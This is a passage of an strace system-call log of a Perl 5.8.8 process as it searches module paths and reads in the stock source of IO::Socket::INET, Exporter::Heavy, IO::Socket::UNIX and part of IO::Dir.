11808 20:20:27.088490 _llseek(6, 0, [0], SEEK_CUR) = 0
11808 20:20:27.088508 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
11808 20:20:27.088888 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.088905 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.088919 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.088932 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.088947 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.088960 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.088975 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.088987 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.089001 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.089013 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.089027 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.089040 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.089054 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.089068 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
11808 20:20:27.089090 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:27.089105 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.089116 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:27.089134 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
11808 20:20:27.090206 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
11808 20:20:27.090491 brk(0x829c000)    = 0x829c000
11808 20:20:27.090846 read(8, "", 4096) = 0
11808 20:20:27.090863 close(8)          = 0
11808 20:20:27.091963 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
11808 20:20:27.092163 _llseek(6, 6496, [6496], SEEK_SET) = 0
11808 20:20:27.092163 _llseek(6, 0, [6496], SEEK_CUR) = 0
11808 20:20:27.092163 close(6)          = 0
11808 20:20:27.092164 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.092164 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.092164 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.092164 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.092164 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.092165 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.092165 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.092173 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.092202 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.092219 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.092260 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.092275 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
11808 20:20:27.092311 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
11808 20:20:27.092327 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e7c8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.092339 _llseek(6, 0, [0], SEEK_CUR) = 0
11808 20:20:27.092354 brk(0x82bd000)    = 0x82bd000
11808 20:20:27.092372 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
11808 20:20:27.093368 _llseek(6, 1386, [1386], SEEK_SET) = 0
11808 20:20:27.459859 _llseek(6, 0, [1386], SEEK_CUR) = 0
11808 20:20:27.459879 close(6)          = 0
11808 20:20:27.459982 stat64("/etc/perl/IO/Dir.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.460001 stat64("/etc/perl/IO/Dir.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460015 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.460029 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460043 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.460056 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460070 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.460082 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460095 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.460108 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460121 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:27.460135 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
11808 20:20:27.460157 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
11808 20:20:27.460173 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e7c8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:27.460186 _llseek(6, 0, [0], SEEK_CUR) = 0
11808 20:20:27.460208 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
11808 20:20:27.460774 stat64("/etc/perl/Tie/Hash.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:27.460792 stat64("/etc/perl/Tie/Hash.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:27.460815 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
